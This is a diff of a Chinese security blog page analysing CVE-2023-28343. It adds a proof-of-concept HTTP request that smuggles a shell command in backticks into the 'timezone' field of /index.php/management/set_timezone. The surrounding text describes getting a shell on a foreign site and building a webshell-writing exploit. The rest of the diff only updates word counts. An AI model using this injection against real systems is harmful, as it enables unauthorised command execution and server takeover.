@@ -438,14 +438,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    665
+                    738
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -469,6 +469,20 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看公众号发现有个漏洞CVE-2023-28343  发了一个poc是 timezone&#x3D;<code>nslookup www.dnslog.cn</code> 我寻思这玩意难道就是回显不了的才能。于是我找国外网站进行复现。拿到了shell并且把代码打包了一份。下载下来仔细研究了一下这套系统是基于mvc开发的。发现了漏洞点。我尝试构造回显。构造成功尝试构造写shell的exp构造成功。我看到某些文章咔咔一顿发。跟风大部分都是这个poc。。。于是乎有了这篇文章。我看github老外也是是反弹shell的。我们能直接getshell 绝不反弹shell。</p>
+<p>poc </p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">/</span>management<span class="token operator">/</span>set_timezone <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">5.1</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">35.0</span><span class="token number">.2309</span><span class="token number">.372</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
+Connection<span class="token punctuation">:</span> close
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">62</span>
+Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>
+Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/index.php/management/datetime</span>
+<span class="token constant">X</span><span class="token operator">-</span>Requested<span class="token operator">-</span>With<span class="token punctuation">:</span> XMLHttpRequest
+
+timezone<span class="token operator">=</span><span class="token string backtick-quoted-string">`nslookup dns`</span>
+</code></pre>
+
 <h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><p>漏洞文件：home\local_web\pages\application\controllers\management.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//漏洞函数</span>
 <span class="token punctuation">&#123;</span>  
@@ -1081,7 +1095,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">17.5k</span>
+                        class="white-color">17.6k</span>
             
             
             
